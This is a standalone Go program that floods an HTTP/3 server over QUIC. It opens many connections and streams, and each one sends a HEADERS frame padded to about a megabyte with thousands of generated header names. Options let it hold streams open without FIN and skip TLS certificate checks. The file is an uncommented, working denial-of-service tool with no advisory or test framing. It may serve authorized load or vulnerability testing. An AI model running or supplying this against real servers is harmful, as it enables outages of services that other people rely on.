package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"sync"
	"time"

	"github.com/quic-go/qpack"
	"github.com/quic-go/quic-go"
)

func main() {
	target := flag.String("target", "127.0.0.1:4433", "")
	authority := flag.String("authority", "localhost", "")
	path := flag.String("path", "/", "")
	method := flag.String("method", "GET", "")
	contentLength := flag.Int("content-length", 0, "")
	conns := flag.Int("conns", 1, "")
	streams := flag.Int("streams", 100, "")
	budget := flag.Int("max-encoded-size", 1<<20, "")
	hold := flag.Duration("hold", 0, "")
	noFin := flag.Bool("no-fin", false, "")
	flag.Parse()

	frame, count := buildFrame(*authority, *path, *method, *contentLength, *budget)
	fmt.Printf("frame=%dB headers=%d conns=%d streams=%d wire=%.1fMB\n",
		len(frame), count, *conns, *streams, float64(len(frame)**conns**streams)/(1<<20))

	tlsConf := &tls.Config{InsecureSkipVerify: true, NextProtos: []string{"h3"}}
	quicConf := &quic.Config{MaxIdleTimeout: 30 * time.Second, KeepAlivePeriod: 5 * time.Second}

	var wg sync.WaitGroup
	for i := 0; i < *conns; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			conn, err := quic.DialAddr(context.Background(), *target, tlsConf, quicConf)
			if err != nil {
				log.Printf("conn %d: %v", id, err)
				return
			}
			defer conn.CloseWithError(0, "done")
			if err := initH3(conn); err != nil {
				log.Printf("conn %d: %v", id, err)
				return
			}
			var sw sync.WaitGroup
			for s := 0; s < *streams; s++ {
				sw.Add(1)
				go func() {
					defer sw.Done()
					stream, err := conn.OpenStream()
					if err != nil {
						return
					}
					if _, err := stream.Write(frame); err != nil {
						stream.Close()
						return
					}
					if *noFin {
						time.Sleep(*hold)
					} else {
						stream.Close()
					}
				}()
			}
			sw.Wait()
			if *noFin {
				time.Sleep(*hold)
			} else {
				fmt.Printf("conn %d done\n", id)
			}
		}(i)
	}
	wg.Wait()
}

func buildFrame(authority, path, method string, contentLength, budget int) ([]byte, int) {
	var qbuf bytes.Buffer
	enc := qpack.NewEncoder(&qbuf)
	count := 0
	field := func(name, value string) bool {
		enc.WriteField(qpack.HeaderField{Name: name, Value: value})
		count++
		return qbuf.Len() >= budget
	}
	field(":method", method)
	field(":path", path)
	field(":scheme", "https")
	field(":authority", authority)
	if contentLength > 0 {
		field("content-length", fmt.Sprint(contentLength))
	}
	for length := 1; length <= 4; length++ {
		done := enumNames("", length, func(name string) bool {
			if name == "te" {
				return false
			}
			return field(name, "x")
		})
		if done {
			break
		}
	}
	block := qbuf.Bytes()
	frame := appendVarint(nil, 0x01)
	frame = appendVarint(frame, uint64(len(block)))
	return append(frame, block...), count
}

func enumNames(prefix string, depth int, fn func(string) bool) bool {
	if depth == 0 {
		return fn(prefix)
	}
	for c := byte('a'); c <= 'z'; c++ {
		if enumNames(prefix+string(c), depth-1, fn) {
			return true
		}
	}
	return false
}

func initH3(conn *quic.Conn) error {
	ctrl, err := conn.OpenUniStream()
	if err != nil {
		return err
	}
	var buf []byte
	buf = appendVarint(buf, 0x00)
	buf = appendVarint(buf, 0x04)
	buf = appendVarint(buf, 0x00)
	if _, err := ctrl.Write(buf); err != nil {
		return err
	}
	enc, err := conn.OpenUniStream()
	if err != nil {
		return err
	}
	if _, err := enc.Write(appendVarint(nil, 0x02)); err != nil {
		return err
	}
	dec, err := conn.OpenUniStream()
	if err != nil {
		return err
	}
	if _, err := dec.Write(appendVarint(nil, 0x03)); err != nil {
		return err
	}
	return nil
}

func appendVarint(buf []byte, v uint64) []byte {
	switch {
	case v < 64:
		return append(buf, byte(v))
	case v < 16384:
		return append(buf, byte((v>>8)|0x40), byte(v))
	case v < 1073741824:
		return append(buf, byte((v>>24)|0x80), byte(v>>16), byte(v>>8), byte(v))
	default:
		return append(buf,
			byte((v>>56)|0xc0), byte(v>>48), byte(v>>40), byte(v>>32),
			byte(v>>24), byte(v>>16), byte(v>>8), byte(v))
	}
}
